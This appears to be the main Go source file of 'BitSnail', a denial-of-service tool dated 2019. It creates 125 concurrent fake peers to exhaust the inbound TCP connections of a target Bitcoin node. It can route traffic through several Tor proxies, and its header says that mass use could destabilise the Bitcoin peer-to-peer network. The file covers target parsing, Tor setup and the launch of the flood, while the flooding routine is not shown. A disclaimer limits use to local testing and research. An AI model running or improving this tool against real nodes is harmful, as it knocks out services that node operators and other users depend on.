/*
BitSnail - an experimental program to exhaust inbound TCP connections of a Bitcoin client. This could possibly slow down the entire Bitcoin P2P network if deployed in bulk.

    .----.   ₿   ₿
   / .-"-.`.  \v/
   | | '\ \ \_/ )
 ,-\ `-.' /.'  /
'---`----'----'

Exhausting inbound connections make the peer inaccessible for others. Essentially, when used against many peers,
this can slow down the Bitcoin network as the P2P network becomes unstable and peers may be unable to connect to each other.

Please note that this DOES NOT EXPLOIT ANY VULNERABILITY. This is typical DoS attempt.
Disclaimer: Use this project only for local testing and security research.

Credits:
For the Bitcoin node handling code (node.go) it uses a fork of https://github.com/agamble/btc-crawler.

License: Unlicense
Date:    7/21/2019
*/

package main

import (
	"fmt"
	"net"
	_ "net/http/pprof"
	"os"
	"strconv"
	"strings"
	"time"
)

// The numberPeerFlood defines how many fake peers shall be created and connect concurrently to the target.
const numberPeerFlood = 125 // DEFAULT_MAX_PEER_CONNECTIONS

// The User Agent is sent in the initial handshake to the target Bitcoin peer.
//const clientUserAgent = "/Satoshi:0.18.0/"
const clientUserAgent = "/BitSnail:0.1.0/"

var torEnable = false

const torCount = 4         // Amount of Tor proxy instances to launch
const torBindIP = ""       // Set local IP to bind. Empty for auto-detect by Tor.
const torSocketBase = 9050 // Port to start
const torRestart = 30      // In minutes

var torExecutable = ""

func main() {
	// get the target from command line
	var targetPeer *net.TCPAddr

	switch len(os.Args) {
	case 2:
		targetPeer = ParseBitcoinTarget(os.Args[1])

	case 3:
		targetPeer = ParseBitcoinTarget(os.Args[1])

		torExecutable = os.Args[2]
		if !strings.HasPrefix(torExecutable, "tor=") {
			targetPeer = nil
			break
		}
		torExecutable = strings.TrimPrefix(torExecutable, "tor=")
		torEnable = true

		if !fileExists(torExecutable) {
			fmt.Printf("Tor executable '%s' does not exist\n", torExecutable)
			return
		}

	default:
	}

	if targetPeer == nil {
		fmt.Printf("Invalid arguments. First parameter must be IP:Port and second optional is tor=[executable].\n")
		return
	}

	// give Tor processes 10 seconds to span up
	if torEnable {
		initTorProxies(torCount, torBindIP, torSocketBase, torExecutable, torRestart)
		fmt.Printf("Wait 10 seconds for %d Tor proxy instances to connect\n", torCount)
		time.Sleep(10 * time.Second)
	}

	// start!
	fmt.Printf("Try to create %d concurrent fake peers, target is %s.\n", numberPeerFlood, targetPeer.String())

	go slowDownTarget(targetPeer, numberPeerFlood)

	go stats(targetPeer.String())

	select {}
}

// ParseBitcoinTarget parses a target in the form of IP:Port. Returns nil if invalid input.
func ParseBitcoinTarget(target string) (tcpAddr *net.TCPAddr) {
	host, port, err := net.SplitHostPort(target)
	if err != nil {
		return nil
	}

	ip := net.ParseIP(host)
	if ip == nil {
		return nil
	}
	portN, err := strconv.Atoi(port)
	if err != nil || portN < 0 || portN > 65535 {
		return nil
	}

	return &net.TCPAddr{IP: ip, Port: portN}
}

func fileExists(path string) bool {
	_, err := os.Stat(path)
	if err == nil {
		return true
	}
	if os.IsNotExist(err) {
		return false
	}
	return true
}
